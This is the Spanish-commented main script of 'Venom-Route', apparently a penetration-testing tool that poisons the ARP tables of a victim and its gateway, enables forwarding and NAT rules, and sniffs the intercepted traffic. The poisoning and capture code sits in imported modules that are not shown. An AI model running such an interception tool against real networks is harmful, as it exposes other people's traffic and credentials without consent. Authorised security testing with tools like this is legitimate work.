#!/usr/bin/env python3
# Copyright (C) 2026 SysMho
#
# Este archivo es parte de Venom-Route.
# Venom-Route es software libre: puedes redistribuirlo y/o modificarlo bajo
# los términos de la GNU General Public License v3 (o, a tu elección, una
# versión posterior) publicada por la Free Software Foundation.
# Se distribuye SIN NINGUNA GARANTÍA. Consulta la GNU GPL para más
# detalles: <https://www.gnu.org/licenses/gpl-3.0.html>
# =============================================================================
# Autor        : SysMho
# Script       : VENOM-ROUTE
# Descripción  : Herramienta de MITM mediante ARP spoofing
#
# Uso          : sudo python3 venom_route.py <IP_VIC> <IP_GW> <IFACE>
#                Flags: -F (FORWARD), -M (MASQUERADE), -I (interactivo)
#
# Advertencia  : Diseñado para pruebas controladas y auditorías
#                con permiso explícito. Uso no autorizado es ilegal.
# =============================================================================


# IMPORTACIÓN DE MÓDULOS PROPIOS

import sys
import time
import signal

# MODULOS PROPIOS
import arp_utils
import iptables_utils
import network_utils
import ui_utils
import sniffer_engine
import sniffer_utils
import anti_sniff_detector
import venom_logger

log = venom_logger.get_logger()




# VARIABLES GLOBALES

ip_victima = ""
ip_gateway = ""
interface = ""
activar_forward_rule = False
activar_masquerade = False
stop_spinner = False
sniffer_thread = None
anti_sniff_thread = None
activar_antinsniff = False

# FUNCIONES

def mostrar_uso():
    print(f"{ui_utils.BOLD_RED}[✘] Uso incorrecto.{ui_utils.NC}")
    print()
    print(f"{ui_utils.YELLOW}Modo de uso correcto:{ui_utils.NC}")
    print(f"  {ui_utils.BOLD_GREEN}MODO AVANZADO:{ui_utils.NC}")
    print(f"    sudo ./venom_route.py IP_VIC IP_GW IFACE [-F] [-M]")
    print()
    print(f"  {ui_utils.BOLD_GREEN}MODO INTERACTIVO:{ui_utils.NC}")
    print(f"    sudo ./venom_route.py o python3 [-I]")
    print()
    print(f"{ui_utils.YELLOW}Opciones:{ui_utils.NC}")
    print(f"  -F = Activa iptables FORWARD a ACCEPT.")
    print(f"  -M = Activa iptables MASQUERADE para NAT.")
    print(f"  -A = Activa el detector anti-sniffer.")
    print(f"  -I = Modo Interactivo")
    print()
    sys.exit(1)

# Funcion que configura entorno previo al ataque

def inicializar_entorno():
    log.info(
        "Inicializando entorno: victima=%s gateway=%s interfaz=%s",
        ip_victima, ip_gateway, interface,
    )
    ui_utils.check_root()
    network_utils.validar_conectividad(ip_victima, ip_gateway)
    signal.signal(signal.SIGINT, signal_handler)
    iptables_utils.activar_forwarding()

# Limpieza real (ARP, iptables, sniffer). La llaman tanto signal_handler
# (Ctrl+C) como el except de main() (error inesperado a mitad de ataque),
# por eso está protegida contra doble ejecución con _cleanup_ejecutado.

_cleanup_ejecutado = False


def limpiar_y_restaurar():
    global _cleanup_ejecutado
    if _cleanup_ejecutado:
        return
    _cleanup_ejecutado = True

    arp_utils.stop_attack.set()

    print(f"[*] Esperando que los hilos de envenenamiento se detengan...")
    for t in arp_utils.arpspoof_processes:
        t.join()

    arp_utils.restore_arp()
    iptables_utils.restaurar_forwarding()

    if activar_forward_rule:
        iptables_utils.restaurar_iptables_forward()

    if activar_masquerade:
        iptables_utils.restaurar_masquerade_rule(interface)

    if activar_antinsniff and anti_sniff_thread is not None:
        print(f"[*] Deteniendo detector anti-sniffer...")
        anti_sniff_detector.detener_anti_sniffer()
        anti_sniff_thread.join()

    print(f"[*] Deteniendo sniffer y guardando capturas...")
    sniffer_engine.detener_captura_sniffer()

    if sniffer_thread is not None:
        print(f"[*] Esperando que el hilo del sniffer finalice...")
        sniffer_thread.join()


# Funcion para el manejo de CTRL+C

def signal_handler(sig, frame):
    global stop_spinner
    log.warning("Interrupción (SIGINT) recibida. Iniciando limpieza...")
    msg = "[✘] Interrupción detectada. Deteniendo proceso..."
    print(f"\n{ui_utils.BOLD_RED}{msg}{ui_utils.NC}")
    stop_spinner = True
    limpiar_y_restaurar()
    msg = "[✔] Ataque detenido y limpieza completada."
    print(f"{ui_utils.BOLD_GREEN}{msg}{ui_utils.NC}")
    log.info("Ataque detenido y limpieza completada.")
    sys.exit(0)

# MAIN

def main():
    global ip_victima, ip_gateway, interface
    global activar_forward_rule, activar_masquerade
    global sniffer_thread, anti_sniff_thread, activar_antinsniff

    ui_utils.check_root()
    log.info("VENOM-ROUTE iniciado.")
    ui_utils.mostrar_banner()

# MODO INTERACTIVO

    if len(sys.argv) == 2 and sys.argv[1] == "-I":
        
        msg1 = "[*] MODO INTERACTIVO INICIADO..."
        print(f"{ui_utils.YELLOW}{msg1}{ui_utils.NC}")
        msg2 = "[*] Detectando interfaces y subredes..."
        print(f"{ui_utils.YELLOW}{msg2}{ui_utils.NC}")
        redes = network_utils.detectar_redes_disponibles()

        if not redes:
            msg = "[✘] No se encontraron interfaces activas."
            print(f"{ui_utils.BOLD_RED}{msg}{ui_utils.NC}")
            sys.exit(1)

        for i, (iface, cidr) in enumerate(redes, 1):
            print(f"[{i}] Interfaz: {iface} → Red: {cidr}")

        print()
        prompt = f"{ui_utils.YELLOW}[→] Selecciona la red: {ui_utils.NC}"
        opcion = int(input(prompt)) - 1
        interface, rango_detectado = redes[opcion]

        msg = f"[→] Rango detectado: {rango_detectado}"
        print(f"{ui_utils.YELLOW}{msg}{ui_utils.NC}")
        prompt = f"{ui_utils.YELLOW}[→] Presiona ENTER o escribe rango: "
        prompt += f"{ui_utils.NC}"
        rango_red = input(prompt).strip()
        if not rango_red:
            rango_red = rango_detectado

        network_utils.interface = interface
        network_utils.escaneo_red(rango_red)
        ip_victima = network_utils.ip_victima
        ip_gateway = network_utils.ip_gateway

# Preguntar si se desea activar el FORWARD y MASQUERADE

        activar_forward_rule = ui_utils.preguntar("¿Activar FORWARDING?")
        activar_masquerade = ui_utils.preguntar("¿Activar MASQUERADE?")
        activar_antinsniff = ui_utils.preguntar("¿Activar anti-sniffer?")

        print()
# MODO AVANZADO CON ARGUMENTOS

    elif len(sys.argv) >= 4:
        
        ip_victima = sys.argv[1]
        ip_gateway = sys.argv[2]
        interface  = sys.argv[3]
        activar_forward_rule = ('-F' in sys.argv)
        activar_masquerade   = ('-M' in sys.argv)

        network_utils.interface = interface
        network_utils.ip_victima = ip_victima
        network_utils.ip_gateway = ip_gateway

        activar_antinsniff = ('-A' in sys.argv)

    else:
        mostrar_uso()

    # Inicializar entorno

    inicializar_entorno()
    
    

    if activar_forward_rule:
        iptables_utils.activar_iptables_forward()

    if activar_masquerade:
        iptables_utils.activar_masquerade_rule(interface)

    # A partir de aquí puede quedar la red envenenada (ARP/iptables), así
    # que CUALQUIER excepción (no solo Ctrl+C) debe disparar la limpieza
    # antes de dejar propagar el error — de lo contrario el proceso puede
    # colgarse esperando a los hilos de ARP (no-daemon) y la red queda
    # envenenada indefinidamente sin restaurar.
    try:
        if ui_utils.preguntar("¿Envenenar ARP?"):
            log.info("Envenenamiento ARP confirmado por el usuario.")
            arp_utils.spoof_objetivo()
            arp_utils.spoof_gateway()
        else:
            log.info("Envenenamiento ARP cancelado por el usuario.")
            msg = "[-] Envenenamiento cancelado."
            print(f"{ui_utils.BOLD_RED}{msg}{ui_utils.NC}")
            sys.exit(0)
        print()

        sniffer_thread = sniffer_engine.iniciar_captura_sniffer(interface)


        msg = "[✓] Sistema en modo de escucha"
        print(f"{ui_utils.BOLD_GREEN}{msg}{ui_utils.NC}")
        log.info("Sistema en modo de escucha (sniffer activo).")
        if activar_antinsniff:
            msg = "[*] Activando anti-sniffer..."
            print(f"{ui_utils.YELLOW}{msg}{ui_utils.NC}")
            anti_sniff_thread = (
                anti_sniff_detector.iniciar_anti_sniffer(interface)
            )
        time.sleep(1)
        while not stop_spinner:
            for puntos in [".", "..", "...", "....", "    "]:
                msg = f"[*] VENOM-ROUTE activo. CTRL+C{puntos}"
                print(f"\r{msg}", end='')
                time.sleep(0.3)
    except Exception:
        log.exception(
            "Excepción no controlada durante el ataque. Ejecutando "
            "limpieza de emergencia."
        )
        print(
            f"{ui_utils.BOLD_RED}[✘] Error inesperado durante el ataque. "
            f"Restaurando red antes de salir...{ui_utils.NC}"
        )
        limpiar_y_restaurar()
        raise

if __name__ == "__main__":
    main()
